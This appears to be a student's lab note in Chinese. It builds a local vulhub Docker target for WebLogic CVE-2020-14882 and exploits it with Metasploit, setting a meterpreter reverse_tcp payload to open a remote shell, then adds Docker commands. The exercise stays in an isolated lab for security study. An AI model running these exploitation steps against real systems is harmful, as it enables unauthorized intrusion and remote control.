---
tags: CVE
---
# 環境建置 & cve-2020-14882
`以 cve-2020-14882作為示範`

---

https://www.luoyunhao.com/archives/23.html
https://www.cnblogs.com/dogecheng/p/11450423.html
https://hackmd.io/@axwl03/metasploit-module-development?fbclid=IwAR3fur7G55PKJxGcis8bvJYIRxFLtyP0iocmbG9PjT2Xl8VPztypNaZnHdc
>學長的筆記
---


### **step 1: 環境建置**
* 在虛擬機上開兩台kali，一個做為漏洞靶機另一個為攻擊主機，要確認兩台都在同一個網域下:
    * 漏洞靶機:
        ```shell
        $ sudo ifconfig eth1 192.168.179.131
        ```
    * 攻擊主機:
        ```shell
        $ sudo ifconfig eth1 192.168.179.130
        ```
    > 可以 ping 看看確定互相可以傳送封包

#### 攻擊主機:
1. 服用 [這篇教學](https://www.luoyunhao.com/archives/23.html) 或 [這篇教學](https://xueyp.github.io/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/2018/08/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-metasploit%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8F%8A%E5%92%8Copevas%E9%85%8D%E5%90%88%E4%BD%BF%E7%94%A8.html) 讓metasploit創建並初始化數據庫
>Metasploit 是 Kali linux 內建的工具，可以使用 Metasploit 來對已知的漏洞進行測試。
    
* 確認連上:
    * ![](https://i.imgur.com/gqRwmqg.png)


#### 漏洞靶機:
1. 安裝 docker & docker-compose
    > [在 Kali Linux 上安裝 Docker 和 Docker Compose
](https://grayguide.net/zh-hant/%E5%9C%A8-kali-linux-%E4%B8%8A%E5%AE%89%E8%A3%9D-docker-%E5%92%8C-docker-compose)
    > [資安這條路 03 - [基礎知識] Docker & Docker-compose & PHP 基本資訊](https://ithelp.ithome.com.tw/articles/10239520)
    
    > $ systemctl enable docker //設置docker開機自啟 

2. 安裝漏洞靶場 vulhub
    > [KALI搭建Docker+Vulhub漏洞复现环境](https://icode.best/i/43980047084292)
    * step 1. 
        ```shell
        在根目錄:
        $ git clone https://github.com/vulhub/vulhub.git
        $ cd vulhub/weblogic
        $ cd CVE-2020-14882           // cve-2020-14882 的漏洞
        ```
    * step 2.
        * 這時候可以 `$ cat docker-compose.yml` 查看這個漏洞的 port
            ```
            version: '2'
            services:
             weblogic:
               image: vulhub/weblogic:12.2.1.3-2018
               ports:
                - "7001:7001"
            ```
        * 
            ```shell
            $ sudo docker-compose up -d //啟動環境
            $ sudo docker ps            //查看目前正在運行的容器
            ```
            ![](https://i.imgur.com/z3nmUWY.png)
3. 環境搭建完成後，可以訪問:`http://192.168.179.131:7001/` ，出現如下頁面證明搭建成功
    ![](https://i.imgur.com/eyG0L71.png)

### **Step 2. 滲透測試**
```shell
$ msfconsole
$ search cve-2020-14882
```
![](https://i.imgur.com/COittc9.png)
```shell
$ use 0
$ show options
```
![](https://i.imgur.com/A9upoBT.png)

```shell
$ setg RHOSTS 192.168.179.131 
//因為靶機在這個ip 。可以 set 或 setg，差別在用 setg 即使換到別的context，設定的host ip 還會保留不用重新設定。
$ setg LHOST 192.168.179.130
$ set target 1
```

![](https://i.imgur.com/gvU90Hu.png)


* 選擇我們要的payload:
```shell
$ show payloads
$ set payload linux/x86/meterpreter/reverse_tcp
```
![](https://i.imgur.com/lZyC1YV.png)
![](https://i.imgur.com/gLczTsN.png)

* 然後 exploit:
![](https://i.imgur.com/DNUrgg9.png)
    * 或輸入 `run` 也可以

* 而後可輸入`background` 再輸入: `sessions`查看拿到多少 sessions
![](https://i.imgur.com/5t0qVcM.png)
* 然後就進到靶機的內部了，可以透過系統相關指令取得靶機的資訊:
    >或輸入`help` 看有什麼指令可以輸入
![](https://i.imgur.com/WTdBO5v.png)

---
* 可以進一步做這樣的 [漏洞利用](https://www.cnblogs.com/Found404/p/15238557.html)

---

### **Step 3. POC script撰寫**

#### 手動導入第三方模塊
* 首先在漏洞網站上找到自己需要的滲透測試模塊進行下載，然後將模塊文件上傳到Metasploit默認模塊位置 `/root/.msf4/modules` 後，重新啟動Metasploit即可 `(建議在 modules 下新建資料夾，便於分類與管理)`
    >[reference](https://www.luoyunhao.com/archives/23.html)
    * 例：在` /root/.msf4/modules` 下新建文件夾 `exploits`，將下載的模塊文件命名為 `webtest.rb` 後放到 `exploits` 文件夹下即可。如果要使用該模塊，則執行命令:
        ```shell
        msf6 > use exploits/webtest
        ```
* 在這邊因為我想先測試是否真的能夠抓到寫的 `.py` ，所以 code 的部分我是先用學姐給的 [範例](https://lovely-amethyst-00f.notion.site/CVE-2020-14882-b9ba843661c947739a78ffee4c0c7313) 下去跑的 `(感謝學姊!)`
    * 將寫好的 `oracle_weblogic_rce.py` 放在 `/home/kali/.msf4/modules/auxiliary/scanner/http` 裡面後
    * 然後先給執行權限:
        ```shell
        $ chmod +x oracle_weblogic_rce.py
        ```
    * 重新啟動Metasploit

---
### 補充
* 環境運行結束後要即時停止進程:
    > $ docker stop {CONTAINER ID}
* 啟動環境:
    > $ docker-compose up -d
* 關閉環境，需要在該環境目錄下執行
    > $ docker-compose down

-----
* docker 常用命令: [取自這裡](https://kknews.cc/code/kp2yv8p.html)
```shell=1
Docker的常用命令
#系統命令
systemctl start docker                          #啟動docker
systemctl stop docker                           #停止docker
systemctl restart docker                        #重啟docker
systemctl enable docker                         #設置docker開機自啟
#基本命令
docker version                                          #查看docker版本
docker info                                                     #查看docker詳細信息
docker --help                                           #查看docker命令
#鏡像命令
docker images                                           #查看docker鏡像列表
docker images -a                                        #列出本地所有鏡像
docker images --digests                         #顯示鏡像的摘要信息
docker search redis                                     #從Docker Hub上查找redis鏡像
docker pull redis                                       #從Docker Hub上下載redis鏡像
docker rmi 373f0984b070                         #刪除IMAGE ID 為373f0984b070的鏡像
#運行命令
#-p 6379:6379   埠映射：前表示主機部分,後表示容器部分
#-d     在後台運行容器（不進入終端）並列印容器ID/容器名
#--name myredis表示自定義容器名為myredis
docker run -d -p 6379:6379 --name myredis redis:latest          #根據鏡像創建並運行容器
#容器命令
docker container ls 或 docker ps                         #查看正在運行的容器
docker container ls -a 或 docker ps -a                   #列出所有容器
docker container start 容器ID 或 容器名稱              #啟動容器
docker start 容器ID 或 容器名稱                                        #啟動容器
docker container stop 容器ID 或 容器名稱                       #停止容器
docker stop 容器ID 或 容器名稱                                 #停止容器
docker container rm 容器ID 或 容器名稱                 #刪除容器
docker rm 容器ID 或 容器名稱                                           #刪除容器
docker container logs -f 容器ID 或 容器名稱            #查看容器日誌
docker exec -it name /bin/bash                                  #進入name（容器名/id）中開啟交互式的終端，exit退出


原文網址：https://kknews.cc/code/kp2yv8p.html
```